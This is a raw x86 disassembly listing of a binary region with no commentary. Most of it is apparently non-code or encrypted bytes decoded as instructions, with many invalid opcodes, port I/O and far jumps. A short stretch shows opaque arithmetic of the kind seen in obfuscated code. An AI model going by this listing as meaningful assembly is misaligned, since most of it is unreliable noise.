  415f67:	mov    eax,esi
  415f69:	push   cs
  415f6a:	repz in eax,dx
  415f6c:	cwde   
  415f6d:	mov    ecx,0x33c62405
  415f72:	fild   WORD PTR [eax-0x45]
  415f75:	fisubr DWORD PTR [edi+0x44]
  415f78:	jno    0x415fca
  415f7a:	dec    ebp
  415f7b:	shr    BYTE PTR [edi],0xff
  415f7e:	fdiv   DWORD PTR [ebp+0x624499f7]
  415f84:	cmp    al,0x49
  415f86:	add    bl,BYTE PTR [edi+eax*1+0x66]
  415f8a:	out    0x19,eax
  415f8c:	add    eax,0x308101b1
  415f91:	or     dh,cl
  415f93:	hlt    
  415f94:	mov    esi,0xe6aded1b
  415f99:	retf   0x3594
  415f9c:	test   al,0xbb
  415f9e:	(bad)  
  415f9f:	cdq    
  415fa0:	xchg   ecx,eax
  415fa1:	(bad)  
  415fa2:	shl    esi,1
  415fa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415fa5:	add    BYTE PTR [esi],0xe6
  415fa8:	push   ds
  415fa9:	add    BYTE PTR [ebx+eax*2-0xc5f6a6d],dh
  415fb0:	out    0xf1,eax
  415fb2:	push   esi
  415fb3:	cmp    esi,ebp
  415fb5:	popf   
  415fb6:	xor    edx,DWORD PTR [ebx+0x31]
  415fb9:	lods   eax,DWORD PTR ds:[esi]
  415fba:	mov    eax,0x9c0546e6
  415fbf:	leave  
  415fc0:	std    
  415fc1:	stos   BYTE PTR es:[edi],al
  415fc2:	test   dh,cl
  415fc4:	ja     0x415f55
  415fc6:	data16 jne 0x416041
  415fc9:	gs call 0xdae:0x2dcf9b23
  415fd1:	or     BYTE PTR [edi],al
  415fd3:	mov    ah,0x6f
  415fd5:	xlat   BYTE PTR ds:[ebx]
  415fd6:	imul   ebp,DWORD PTR [edi+eiz*8+0x558286f6],0x74
  415fde:	repz enter 0xb30d,0x3b
  415fe3:	jecxz  0x415fc6
  415fe5:	sub    ebp,eax
  415fe7:	mov    edx,ebx
  415fe9:	das    
  415fea:	stc    
  415feb:	sar    BYTE PTR [ebx],1
  415fed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415fee:	mov    bh,0x84
  415ff0:	mov    dl,0x47
  415ff2:	stc    
  415ff3:	sub    DWORD PTR [edx*8-0x55651c4e],edx
  415ffa:	pop    ss
  415ffb:	inc    edx
  415ffc:	mov    al,0x29
  415ffe:	ins    BYTE PTR es:[edi],dx
  415fff:	js     0x415ff0
  416001:	(bad)  
  416003:	(bad)  
  416004:	jp     0x416045
  416006:	sbb    dh,BYTE PTR [edi+0xb]
  416009:	sub    esp,edx
  41600b:	outs   dx,BYTE PTR ds:[esi]
  41600c:	jbe    0x415fb4
  41600e:	ror    BYTE PTR [edx-0x59],1
  416011:	add    edx,esi
  416013:	xchg   ecx,eax
  416014:	outs   dx,DWORD PTR ds:[esi]
  416015:	cmp    eax,0x268e5db3
  41601a:	xchg   BYTE PTR [esi+0x780dc9db],dh
  416020:	pop    ecx
  416021:	retf   0x9314
  416024:	rcl    BYTE PTR [esi+edx*4],0x8f
  416028:	cli    
  416029:	push   cs
  41602a:	imul   edi,DWORD PTR [esi+eiz*2+0x25],0xffffffca
  41602f:	in     eax,0xe3
  416031:	pop    es
  416032:	inc    ebp
  416033:	dec    esi
  416034:	popa   
  416035:	mov    ds:0x6516928e,al
  41603a:	mov    ds:0x843476d,al
  41603f:	popa   
  416040:	out    0x86,al
  416042:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416043:	fnstenv [ebp+eax*1+0x50b23d36]
  41604a:	mov    al,BYTE PTR [edx-0x1d021d62]
  416050:	shufps xmm3,XMMWORD PTR [edx-0x73],0xa5
  416055:	add    BYTE PTR gs:[ecx],dh
  416058:	mov    esp,0x911dc51c
  41605d:	outs   dx,DWORD PTR ds:[esi]
  41605e:	rcr    BYTE PTR [eax-0x1d],cl
  416061:	push   esi
  416062:	push   esi
  416063:	pop    ds
  416064:	mov    cl,BYTE PTR ds:0x1cc29c42
  41606a:	push   eax
  41606b:	jecxz  0x41600c
  41606d:	daa    
  41606e:	outs   dx,BYTE PTR ds:[esi]
  41606f:	in     al,0xad
  416071:	pop    ds
  416072:	pushf  
  416073:	arpl   WORD PTR [eax-0x2592b34d],bx
  416079:	ins    DWORD PTR es:[edi],dx
  41607a:	ret    0x85f
  41607d:	add    al,BYTE PTR [ecx+0xd]
  416080:	fnsave [ebp+0x10]
  416083:	iret   
  416084:	neg    edx
  416086:	mov    ecx,0x121bf78c
  41608b:	call   0x4e93:0x14fef182
  416092:	sub    eax,0x525f033b
  416097:	mov    es,WORD PTR [ecx-0x72]
  41609a:	imul   DWORD PTR [ebx+0x410907d6]
  4160a0:	mov    esi,0x14a9e693
  4160a5:	cld    
  4160a6:	cs data16 xor al,0x38
  4160aa:	lahf   
  4160ab:	das    
  4160ac:	inc    esp
  4160ad:	fsub   QWORD PTR [ebp+eiz*1+0x7fe636ee]
  4160b4:	stos   BYTE PTR es:[edi],al
  4160b5:	in     al,dx
  4160b6:	dec    esi
  4160b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160b8:	push   ecx
  4160b9:	adc    bl,BYTE PTR ds:0xec678865
  4160bf:	imul   ebp,DWORD PTR [ebx-0xe],0xffffffc6
  4160c3:	dec    eax
  4160c4:	sub    eax,0xf1ef53e3
  4160c9:	xlat   BYTE PTR ds:[ebx]
  4160ca:	push   0x643960ba
  4160cf:	nop
  4160d0:	xlat   BYTE PTR ds:[ebx]
  4160d1:	mov    ebx,0xfe09cbce
  4160d6:	cld    
  4160d7:	mov    DWORD PTR [eax],esp
  4160d9:	xor    ebx,ebx
  4160db:	add    eax,ecx
  4160dd:	xchg   edi,eax
  4160de:	cmp    al,0x37
  4160e0:	mov    ds:0xc1d1aed3,eax
  4160e5:	fcomp  st(3)
  4160e7:	int    0x98
  4160e9:	xor    DWORD PTR [edi],ecx
  4160eb:	jle    0x416159
  4160ed:	inc    esp
  4160ee:	cmp    ecx,DWORD PTR [ebp+0x2c6f856b]
  4160f4:	je     0x41607a
  4160f6:	std    
  4160f7:	or     edi,DWORD PTR ss:[esi+ecx*2-0x6031789]
  4160ff:	dec    eax
  416100:	pusha  
  416101:	xchg   edi,eax
  416102:	or     ebp,DWORD PTR [ebx+0x394a2b27]
  416108:	mov    al,ds:0x2a60aa5d
  41610d:	aam    0x33
  41610f:	int3   
  416110:	(bad)  
  416111:	addr16 js 0x4160af
  416114:	xor    DWORD PTR [ebp+0x2571e33f],edi
  41611a:	push   esp
  41611b:	cmp    ah,BYTE PTR [esp+ecx*4+0x5016751c]
  416122:	adc    BYTE PTR [edx+0x45],cl
  416125:	shl    BYTE PTR [edi+0x69],cl
  416128:	add    bl,BYTE PTR [ecx+0x56]
  41612b:	std    
  41612c:	enter  0x1762,0x22
  416130:	add    BYTE PTR [ebx-0x42],0x6c
  416134:	pop    es
  416135:	scas   eax,DWORD PTR es:[edi]
  416136:	jne    0x41619b
  416138:	and    eax,0x16c9e3f4
  41613d:	mov    es,esi
  41613f:	fmulp  st(7),st
  416141:	bound  esi,QWORD PTR [ebp+0xe]
  416144:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416145:	inc    eax
  416146:	mov    esi,0x7dde056b
  41614b:	das    
  41614c:	sbb    DWORD PTR [eax],eax
  41614e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41614f:	sti    
  416150:	pop    ss
  416151:	jl     0x41612c
  416153:	inc    edx
  416154:	outs   dx,BYTE PTR ds:[esi]
  416155:	outs   dx,BYTE PTR ds:[esi]
  416156:	out    0x1a,al
  416158:	or     al,0x35
  41615a:	bound  ebx,QWORD PTR [ecx+0x4edfa2e0]
  416160:	stc    
  416161:	mov    BYTE PTR ds:0x4e52a9bf,0x1
  416168:	jg     0x416175
  41616a:	loopne 0x416126
  41616c:	pusha  
  41616d:	out    0x41,al
  41616f:	test   BYTE PTR [ecx-0x19],dh
  416172:	add    al,0x95
  416174:	cmp    DWORD PTR [ebp+0x658420b6],eax
  41617a:	jle    0x4161c0
  41617c:	iret   
  41617d:	adc    eax,DWORD PTR [edx+0x69]
  416180:	imul   ecx,DWORD PTR [edi+ebx*1-0x59],0xffffff8c
  416185:	xchg   ecx,eax
  416186:	mov    dh,ah
  416188:	dec    ecx
  416189:	inc    edi
  41618a:	pop    ds
  41618b:	fsubp  st(2),st
  41618d:	sti    
  41618e:	mov    edx,0xbb218f11
  416193:	xor    esi,DWORD PTR [ebx-0x5dd07606]
  416199:	mov    cl,0xee
  41619b:	pop    edi
  41619c:	daa    
  41619d:	dec    ebp
  41619e:	xor    eax,0x29a6611
  4161a3:	popa   
  4161a4:	dec    ecx
  4161a5:	add    al,0x19
  4161a7:	pop    ebx
  4161a8:	mov    dh,0x5f
  4161aa:	hlt    
  4161ab:	neg    BYTE PTR fs:[edx+0x1c]
  4161af:	dec    esi
  4161b0:	loopne 0x41614a
  4161b2:	dec    esp
  4161b3:	push   ebp
  4161b4:	mov    ch,0x71
  4161b6:	jl     0x4161e9
  4161b8:	(bad)  
  4161b9:	es cmp al,0x26
  4161bc:	push   cs
  4161bd:	lea    esp,[edx-0x17]
  4161c0:	jle    0x4161fd
  4161c2:	mov    ebx,0x4beed586
  4161c7:	mov    ds:0xb5c80ca3,eax
  4161cc:	pop    esi
  4161cd:	jmp    DWORD PTR [ecx-0x57]
  4161d0:	lock xchg ecx,eax
  4161d2:	cmp    DWORD PTR [edi],esi
  4161d4:	je     0x41617d
  4161d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161d7:	jge    0x41623d
  4161d9:	pop    ds
  4161da:	test   DWORD PTR [edx+0x3f4607f3],edx
  4161e0:	mov    fs,WORD PTR [edi-0x6faa5278]
  4161e6:	adc    BYTE PTR [ebp+esi*8+0x54],ah
  4161ea:	std    
  4161eb:	or     ebp,DWORD PTR [edx-0x218e467c]
  4161f1:	cwde   
  4161f2:	rcr    ebx,0x5e
  4161f5:	rol    BYTE PTR [edi],0x78
  4161f8:	scas   al,BYTE PTR es:[edi]
  4161f9:	iret   
  4161fa:	push   ss
  4161fb:	jmp    0xc11d:0xf69be3da
  416202:	jecxz  0x41625a
  416204:	add    esp,DWORD PTR [ebp-0x7e]
  416207:	dec    edx
  416208:	mov    ebp,DWORD PTR [esi]
  41620a:	mov    dh,0x72
  41620c:	in     eax,0x8a
  41620e:	lods   al,BYTE PTR ds:[esi]
  41620f:	lock arpl sp,cx
  416212:	call   DWORD PTR [ebx+0x5d677659]
  416218:	enter  0x827b,0x97
  41621c:	(bad)  
  41621d:	cmc    
  41621e:	mov    bh,0xb
  416220:	les    edx,FWORD PTR [edx]
  416222:	inc    esp
  416223:	sub    dl,BYTE PTR [esi-0xe945c09]
  416229:	and    DWORD PTR [edx-0x54fae6c9],edx
  41622f:	mov    dh,0xef
  416231:	pop    ds
  416232:	and    ecx,esi
  416234:	push   ds
  416235:	mov    al,ds:0xbe32ed05
  41623a:	cmp    bh,cl
  41623c:	mov    dl,0x98
  41623e:	jb     0x416297
  416240:	ror    BYTE PTR [edi-0x192026e0],cl
  416246:	inc    esi
  416247:	lds    esi,FWORD PTR [ebx]
  416249:	rcl    DWORD PTR [ebp-0x4ab15366],cl
  41624f:	jno    0x41622d
  416251:	mov    ds:0x194459b3,eax
  416256:	and    esp,DWORD PTR [edx]
  416258:	cmp    eax,0x749bd765
  41625d:	jo     0x41627f
  41625f:	and    DWORD PTR [eax],ebx
  416261:	jge    0x41626f
  416263:	(bad)  
  416264:	jg     0x416221
  416266:	add    esi,DWORD PTR [edx]
  416268:	(bad)  
  416269:	in     eax,dx
  41626a:	mov    cl,0xd8
  41626c:	inc    esi
  41626d:	sub    al,0xde
  41626f:	xchg   ecx,eax
  416270:	lds    esi,FWORD PTR [edx+0x4c4ce358]
  416276:	sbb    BYTE PTR [ebp-0x5e360d5a],cl
  41627c:	shr    ah,0xb
  41627f:	pop    ss
  416280:	xchg   esi,eax
  416281:	add    edi,DWORD PTR [eax-0x521e26b]
  416287:	mov    esi,DWORD PTR ds:0xf4edb58f
  41628d:	shr    DWORD PTR [edx+edx*4-0x2d],1
  416291:	aas    
  416292:	(bad)  
  416293:	adc    bl,BYTE PTR [edx+esi*4+0x28250c8d]
  41629a:	gs jbe 0x41630d
  41629d:	mov    edx,0xeca44f7d
  4162a2:	mov    ds:0xb1ec4228,eax
  4162a7:	aad    0xd
  4162a9:	sub    eax,0xb14a54d
  4162ae:	ja     0x4162bd
  4162b0:	fiadd  DWORD PTR [ecx+0x187bcf8f]
  4162b6:	adc    DWORD PTR [eax],esi
  4162b8:	int3   
  4162b9:	repnz repz aam 0x79
  4162bd:	and    DWORD PTR [ebx],esi
  4162bf:	pushf  
  4162c0:	leave  
  4162c1:	adc    DWORD PTR [edi-0x2b907fd7],ebp
  4162c7:	test   edx,edx
  4162c9:	popf   
  4162ca:	test   DWORD PTR [esi-0x60e025d2],eax
  4162d0:	rol    BYTE PTR [eax+0x3],0xe8
  4162d4:	mov    DWORD PTR [ebx],ebx
  4162d6:	sbb    DWORD PTR [esi+eiz*4+0x4b544b44],esi
  4162dd:	jl     0x416271
  4162df:	fdivr  DWORD PTR [ebx+0x46]
  4162e2:	jno    0x4162ce
  4162e4:	jmp    0x61c3:0x2438cb62
  4162eb:	faddp  st(6),st
  4162ed:	sub    edi,DWORD PTR [ebx]
  4162ef:	inc    eax
  4162f0:	jmp    0x4ff6303b
  4162f5:	push   ds
  4162f6:	push   eax
  4162f7:	mov    ds:0xa3d5c819,al
  4162fc:	pushf  
  4162fd:	call   0x83f33fd6
  416302:	retf   0x8bbe
  416305:	test   DWORD PTR [eax-0x9],edi
  416308:	sub    BYTE PTR [ecx-0x10435ee7],dh
  41630e:	fstp   QWORD PTR [edx-0x60]
  416311:	fadd   DWORD PTR ds:0x867f1035
  416317:	aam    0xe7
  416319:	pop    esi
  41631a:	mov    dh,al
  41631c:	ret    0xfef
  41631f:	xchg   ebp,eax
  416320:	fisubr WORD PTR [ebx+0x705ff484]
  416326:	dec    edi
  416327:	mov    DWORD PTR [ebp-0x2c],0x347d
  41632e:	mov    eax,DWORD PTR [ebp-0x2c]
  416331:	mov    edx,DWORD PTR [ebp-0x28]
  416334:	mov    ebx,DWORD PTR [ebp-0x24]
  416337:	sub    eax,0x24b3
  41633c:	imul   eax,edx
  41633f:	xor    eax,0x74ef
  416344:	xor    edx,edx
  416346:	div    ebx
  416348:	mov    edx,DWORD PTR [ebp-0x20]
  41634b:	mov    ebx,DWORD PTR [ebp+0x8]
  41634e:	push   0x20
  416350:	and    eax,edx
  416352:	mov    edx,edi
  416354:	sub    edx,eax
  416356:	sub    edx,0x683
  41635c:	mov    DWORD PTR [ebp-0x2c],edx
  41635f:	mov    eax,DWORD PTR [ebp-0x30]
  416362:	mov    edx,DWORD PTR [ebp-0x34]
  416365:	xor    al,dl
  416367:	mov    edx,DWORD PTR [ebp-0x2c]
  41636a:	xor    al,0x58
  41636c:	and    al,0xd8
  41636e:	add    al,BYTE PTR [ebp+0xc]
  416371:	add    al,0x28
  416373:	jmp    0x41677c
  416378:	mov    ebx,0x41d6c237
  41637d:	cmp    edi,DWORD PTR [ebx-0x6192d245]
  416383:	nop
  416384:	sbb    BYTE PTR [ebx],dl
  416386:	mov    ah,0xcf
  416388:	cmp    al,0xcc
  41638a:	sar    BYTE PTR [esi-0x41413b72],0xed
  416391:	pop    ds
  416392:	xchg   edx,eax
  416393:	rol    DWORD PTR [edi],0x6d
  416396:	and    eax,0xf7890a18
  41639b:	push   edx
  41639c:	pop    ss
  41639d:	out    0x54,al
  41639f:	push   esp
  4163a0:	jb     0x416417
  4163a2:	adc    esp,ebp
  4163a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163a5:	imul   edi,edi,0x3cd33b20
  4163ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163ac:	fcomp  QWORD PTR [edx+0x4c847c1b]
  4163b2:	or     al,BYTE PTR [esi+0x28]
  4163b5:	push   es
  4163b6:	in     al,dx
  4163b7:	cmc    
  4163b8:	and    al,0xaa
  4163ba:	xlat   BYTE PTR ds:[ebx]
  4163bb:	adc    BYTE PTR [edx+0x1a1fea94],0x53
  4163c2:	mov    WORD PTR [edi+0x5dcd63b7],cs
  4163c8:	jl     0x416436
  4163ca:	xor    bh,BYTE PTR [eax-0x7d]
  4163cd:	mov    cl,0x7d
  4163cf:	lock pop esi
  4163d1:	sbb    bh,BYTE PTR [edi-0x85d2e7f]
  4163d7:	sub    dl,BYTE PTR [esp+esi*8]
  4163da:	adc    DWORD PTR [ebx-0x6a242e0f],0xffffff9d
  4163e1:	(bad)  
  4163e2:	repz scas al,BYTE PTR es:[edi]
  4163e4:	mov    BYTE PTR [esi-0xf],al
  4163e7:	push   es
  4163e8:	adc    cl,BYTE PTR [ecx]
  4163ea:	(bad)  
  4163eb:	xchg   esp,eax
  4163ec:	pop    ss
  4163ed:	hlt    
  4163ee:	mov    ebp,0xec27990d
  4163f3:	fwait
  4163f4:	sahf   
  4163f5:	int    0x90
  4163f7:	fs leave 
  4163f9:	xor    BYTE PTR [esi+ebp*4],al
  4163fc:	or     DWORD PTR [edx+0x15147a34],edi
  416402:	loop   0x4163cc
  416404:	and    BYTE PTR [eax],dh
  416406:	ret    0x7476
  416409:	xlat   BYTE PTR ds:[ebx]
  41640a:	ja     0x4163bc
  41640c:	mov    bh,BYTE PTR ss:[edi+0x25]
  416410:	adc    bh,BYTE PTR [esp+eax*8]
  416413:	in     al,0xc9
  416415:	into   
  416416:	push   0xffffffbe
  416418:	data16 mov WORD PTR [esi],?
  41641b:	mov    esi,0x795a604e
  416420:	jmp    0x65a6:0xac81c829
  416427:	pop    ds
  416428:	push   ds
  416429:	or     al,0x18
  41642b:	mov    ebx,0x65f5d8ec
  416430:	sub    cl,0xa6
  416433:	lods   al,BYTE PTR ds:[esi]
  416434:	and    DWORD PTR [ecx+esi*4+0x631f1e7b],esi
  41643b:	pushf  
  41643c:	scas   al,BYTE PTR es:[edi]
  41643d:	xor    eax,0xce8ae1ea
  416442:	add    al,0x7a
  416444:	fiadd  DWORD PTR [esi-0x64]
  416447:	out    0x18,al
  416449:	(bad)  
  41644a:	repnz fsqrt 
  41644d:	dec    esi
  41644e:	push   edi
  41644f:	fnstsw WORD PTR [ecx-0x495a9c6e]
  416455:	test   DWORD PTR [ebp+ebp*4-0x6631eba0],0x2b3ce64e
  416460:	mov    eax,ds:0xee792b6d
  416465:	ret    0x513f
  416468:	popa   
  416469:	jecxz  0x416440
  41646b:	lock stos BYTE PTR es:[edi],al
  41646d:	pop    eax
  41646e:	jb     0x416463
  416470:	popa   
  416471:	out    dx,eax
  416472:	adc    BYTE PTR [edx],bl
  416474:	cld    
  416475:	shl    dh,1
  416477:	xor    BYTE PTR [edx+0x45],bl
  41647a:	sbb    al,dl
  41647c:	jmp    0x6f29:0xc797648e
  416483:	push   edi
  416484:	cwde   
  416485:	add    eax,ebx
  416487:	stos   DWORD PTR es:[edi],eax
  416488:	das    
  416489:	popf   
  41648a:	sti    
  41648b:	jmp    0x298d026b
  416490:	xlat   BYTE PTR ds:[ebx]
  416491:	jbe    0x41647d
  416493:	icebp  
  416494:	retf   0xef7e
  416497:	call   0xe31cd22b
  41649c:	mov    DWORD PTR [esi-0x62],esi
  41649f:	adc    eax,0xf646b73f
  4164a4:	cli    
  4164a5:	inc    esp
  4164a6:	ror    bh,cl
  4164a8:	loope  0x4164da
  4164aa:	ja     0x416509
  4164ac:	mov    al,ds:0xf06709f4
  4164b1:	mov    DWORD PTR [ebp+0x63],esi
  4164b4:	test   BYTE PTR [edi-0x6d],ah
  4164b7:	dec    eax
  4164b8:	cmp    eax,0x20c58fa5
  4164bd:	aas    
  4164be:	add    al,0x94
  4164c0:	clc    
  4164c1:	add    al,0x32
  4164c3:	dec    esi
  4164c4:	mov    edx,0x8f8e307b
  4164c9:	mov    DWORD PTR [ebx+0x73f3e8e8],0x5e0b1b7f
  4164d3:	retf   0xc9a6
  4164d6:	or     DWORD PTR [edx-0x96aa438],0xffffff8c
  4164dd:	mov    dl,0x1c
  4164df:	add    dl,BYTE PTR [edx]
  4164e1:	sub    BYTE PTR [eax+edi*4+0x2b],bl
  4164e5:	(bad)  
  4164e6:	cmp    cl,BYTE PTR [edi]
  4164e8:	lds    edi,FWORD PTR [ecx+0x1c]
  4164eb:	test   edx,0x2797fd12
  4164f1:	mov    bl,0x1f
  4164f3:	repnz addr16 dec ecx
  4164f6:	enter  0x8757,0xc0
  4164fa:	adc    bh,bl
  4164fc:	cmp    DWORD PTR [edi],esp
  4164fe:	push   ebx
  4164ff:	mov    al,ds:0xe992c2e3
  416504:	(bad)
  416508:	xor    dh,ch
  41650a:	pop    ebx
  41650b:	in     eax,0x98
  41650d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41650e:	lock cmp ecx,DWORD PTR [ebp+ebx*4-0x1df52b37]
  416516:	int3   
  416517:	enter  0x7dd1,0xe5
  41651b:	sbb    BYTE PTR [edi],ch
  41651d:	pop    eax
  41651e:	cmp    BYTE PTR [eax+0x5102b9d4],0x8b
  416525:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416526:	inc    edx
  416527:	fimul  WORD PTR [edi-0x5e]
  41652a:	jnp    0x41650f
  41652c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41652d:	sahf   
  41652e:	push   ss
  41652f:	push   edi
  416530:	xor    dh,BYTE PTR [edx-0x1]
  416533:	adc    eax,0xb2a4251a
  416538:	push   edx
  416539:	jmp    0x7d9a11f2
  41653e:	dec    ebp
  41653f:	adc    edi,DWORD PTR [ecx+0x7e]
  416542:	add    DWORD PTR [ebp-0x54],edx
  416545:	jns    0x41658a
  416547:	in     eax,0x16
  416549:	jl     0x4165a3
  41654b:	cmp    al,0x20
  41654d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41654e:	cld    
  41654f:	rcl    dl,1
  416551:	mov    ss,WORD PTR [eax]
  416553:	push   es
  416554:	mov    ds:0x57414a5b,eax
  416559:	test   eax,0xce3a289f
  41655e:	lods   al,BYTE PTR ds:[esi]
  41655f:	loopne 0x4165cf
  416561:	(bad)  
  416562:	cmp    dh,ch
  416564:	push   0x7
  416566:	mov    DWORD PTR [eax+ebx*4],edi
  416569:	outs   dx,BYTE PTR ds:[esi]
  41656a:	stos   DWORD PTR es:[edi],eax
  41656b:	cdq    
  41656c:	sub    ebx,DWORD PTR [eax-0x28]
  41656f:	iret   
  416570:	fimul  DWORD PTR [edx]
  416572:	push   eax
  416573:	ja     0x4165b9
  416575:	and    edx,DWORD PTR [ecx-0x3c29c1e5]
  41657b:	shl    ch,0x45
  41657e:	jno    0x4165ff
  416580:	jb     0x41655b
  416582:	push   ss
  416583:	adc    esi,DWORD PTR [ebx-0x54]
  416586:	mov    esi,0x5f1ec32f
  41658b:	pop    edi
  41658c:	out    dx,al
  41658d:	xchg   ebx,eax
  41658e:	retw   0xfb40
  416592:	fmulp  st(5),st
  416594:	out    dx,eax
  416595:	or     BYTE PTR [ebp-0x64],ch
  416598:	popa   
  416599:	int    0x87
  41659b:	arpl   WORD PTR [edx+0x53],si
  41659e:	in     al,dx
  41659f:	aam    0x2a
  4165a1:	std    
  4165a2:	mov    edi,0x544a9043
  4165a7:	dec    ebp
  4165a8:	out    0xd4,al
  4165aa:	push   edx
  4165ab:	stos   DWORD PTR es:[edi],eax
  4165ac:	sbb    BYTE PTR [ebx+0x479dcddc],0x8a
  4165b3:	xchg   BYTE PTR [esp+eax*8-0x8],dh
  4165b7:	enter  0x5ad5,0x66
  4165bb:	not    ebx
  4165bd:	push   eax
  4165be:	loop   0x41660d
  4165c0:	stc    
  4165c1:	shr    DWORD PTR [eax+0x2a],cl
  4165c4:	adc    ebp,DWORD PTR [edi]
  4165c6:	mov    WORD PTR [edx-0x20],gs
  4165c9:	or     dh,BYTE PTR [eax]
  4165cb:	add    al,0x5b
  4165cd:	test   ah,0xa4
  4165d0:	sub    eax,0xe0ad69bc
  4165d5:	mov    cl,0x18
  4165d7:	es (bad) 
  4165d9:	pusha  
  4165da:	pop    ss
  4165db:	ss (bad) 
  4165dd:	js     0x41658b
  4165df:	in     al,dx
  4165e0:	fist   WORD PTR [edi+0x38]
  4165e3:	adc    DWORD PTR [edx+0x5],esp
  4165e6:	mov    dh,0x69
  4165e8:	and    DWORD PTR [esi],eax
  4165ea:	js     0x416652
  4165ec:	mov    dl,0xe9
  4165ee:	xor    al,al
  4165f0:	in     al,0x8b
  4165f2:	and    ebp,DWORD PTR [esi+eax*8-0x4b]
  4165f6:	out    dx,eax
  4165f7:	sbb    al,0xd6
  4165f9:	aas    
  4165fa:	mov    al,0x55
  4165fc:	jmp    0x214e650f
  416601:	fistp  DWORD PTR [edx-0x2f720f37]
  416607:	sahf   
  416608:	adc    edx,DWORD PTR [eax]
  41660a:	aas    
  41660b:	add    DWORD PTR ds:0x50a5b6fc,0xffffffbd
  416612:	neg    DWORD PTR [edx]
  416614:	inc    ecx
  416615:	std    
  416616:	xrelease mov BYTE PTR [edx],0xcf
  41661a:	lds    eax,FWORD PTR [esi+0x66f61c97]
  416620:	ficom  WORD PTR [esi+esi*1]
  416623:	sbb    ecx,DWORD PTR [ecx+0x41da5b50]
  416629:	xor    eax,DWORD PTR ds:0x427980f9
  41662f:	lods   eax,DWORD PTR ds:[esi]
  416630:	xchg   edx,eax
  416631:	sbb    al,0x7
  416633:	stc    
  416634:	inc    esi
  416635:	push   edi
  416636:	aaa    
  416637:	shl    DWORD PTR [ebp-0x48],0xb2
  41663b:	aaa    
  41663c:	ret    
  41663d:	sbb    eax,0x64fedadc
  416642:	xchg   edi,eax
  416643:	jl     0x4165de
  416645:	mov    esp,eax
  416647:	ja     0x41664e
  416649:	clc    
  41664a:	repnz pop ebp
  41664c:	nop    DWORD PTR [ebp-0xb]
  416650:	fiadd  WORD PTR [ecx-0x3c]
  416653:	or     ebx,esi
  416655:	enter  0x797c,0x40
  416659:	lea    ebp,[esi]
  41665b:	sub    eax,0xd33b9a88
  416660:	mov    ah,0xec
  416662:	inc    edx
  416663:	sub    DWORD PTR [esp+ebx*1+0x6a9a6e61],0x8f4e608
  41666e:	popa   
  41666f:	in     al,dx
  416670:	cmp    BYTE PTR [edx+0x24],ch
  416673:	push   ecx
  416674:	outs   dx,BYTE PTR ds:[esi]
  416675:	aad    0x1f
  416677:	std    
  416678:	icebp  
  416679:	pop    esi
  41667a:	addr16 std 
  41667c:	mov    bl,0xf3
  41667e:	test   al,0xb9
  416680:	pop    ebx
  416681:	push   esp
  416682:	test   DWORD PTR [edi-0x15],eax
  416685:	nop
  416686:	loope  0x4166f3
  416688:	nop
  416689:	sbb    ah,al
  41668b:	stos   BYTE PTR es:[edi],al
  41668c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41668d:	jg     0x4166bb
  41668f:	adc    cl,bl
  416691:	cmc    
  416692:	into   
  416693:	sti    
  416694:	outs   dx,DWORD PTR ds:[esi]
  416695:	js     0x41666e
  416697:	add    DWORD PTR [edi-0x68],0x6c
  41669b:	cwde   
  41669c:	sub    eax,0xa050e398
  4166a1:	pop    esi
  4166a2:	aam    0x3e
  4166a4:	aas    
  4166a5:	jmp    0x863ecf66
  4166aa:	xchg   esp,eax
  4166ab:	out    0x91,al
  4166ad:	cmp    bh,0xcf
  4166b0:	pop    ds
  4166b1:	ds std 
  4166b3:	xchg   ebx,eax
  4166b4:	mov    ds:0x104fe010,al
  4166b9:	sbb    ebp,ebx
  4166bb:	into   
  4166bc:	xor    eax,0x5680876
  4166c1:	mov    esp,0x9bc7bb67
  4166c6:	xchg   esi,eax
  4166c7:	cli    
  4166c8:	repz lahf 
  4166ca:	loope  0x4166af
  4166cc:	mul    DWORD PTR [edi-0x2bc0a6c9]
  4166d2:	adc    BYTE PTR [edx],bh
  4166d4:	dec    edx
  4166d5:	call   0x1922:0xf2644449
  4166dc:	pop    ebp
  4166dd:	push   cs
  4166de:	sub    al,0x15
  4166e0:	cmc    
  4166e1:	scas   al,BYTE PTR es:[edi]
  4166e2:	shl    BYTE PTR [ebx+0x7c],0x45
  4166e6:	ins    DWORD PTR es:[edi],dx
  4166e7:	test   eax,0x3e876520
  4166ec:	test   eax,0x34e3ccf
  4166f1:	loope  0x4166c8
  4166f3:	lea    esi,[edi]
  4166f5:	or     bl,ch
  4166f7:	sbb    eax,0x15582878
  4166fc:	in     al,dx
  4166fd:	or     BYTE PTR [ecx+0x52e94cb8],0xc2
  416704:	adc    esp,DWORD PTR [edi]
  416706:	out    0x97,eax
  416708:	push   ecx
  416709:	and    al,dl
  41670b:	mov    edx,0x12005b26
  416710:	aad    0x36
  416712:	mov    eax,DWORD PTR [edx+0x54]
  416715:	test   al,0x81
  416717:	ss mov ecx,0x94307293
  41671d:	mov    BYTE PTR [edx+0x326cf44],bh
  416723:	cwde   
  416724:	dec    eax
  416725:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416726:	cmp    al,0x19
  416728:	dec    eax
  416729:	mov    ch,0x97
  41672b:	sub    BYTE PTR [esi+0x36],al
  41672e:	icebp  
  41672f:	outs   dx,BYTE PTR ds:[esi]
  416730:	je     0x4167a0
  416732:	mov    ebp,0x3651c90e
  416737:	fisub  DWORD PTR [ecx]
  416739:	or     al,0x5
  41673b:	addr16 cli 
  41673d:	cmp    DWORD PTR [eax-0x80],ebx
  416740:	std    
  416741:	push   0x2210bdba
  416746:	fisttp DWORD PTR [edx+0x48ca242b]
  41674c:	les    eax,FWORD PTR [ebp+0x13]
  41674f:	int3   
